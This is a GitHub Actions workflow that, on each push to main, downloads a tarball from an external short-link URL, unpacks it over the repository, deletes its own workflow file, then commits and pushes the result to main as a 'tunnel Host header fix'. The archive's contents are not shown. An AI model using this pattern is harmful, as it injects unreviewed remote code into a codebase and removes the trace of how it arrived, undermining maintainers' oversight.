name: apply-hostfix

on:
  push:
    branches: [ main ]

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Apply tunnel Host fix
        run: |
          curl -fsSL "https://aka.doubaocdn.com/s/UJXOzt5iJB" -o /tmp/hostfix.tar.gz
          tar -xzf /tmp/hostfix.tar.gz -C .
          rm -f .github/workflows/apply-hostfix.yml
          git config user.name "Geeker"
          git config user.email "241876181@qq.com"
          git add -A
          git commit -m "fix: allow tunnel Host header for HTTP transports"
          git push origin HEAD:main
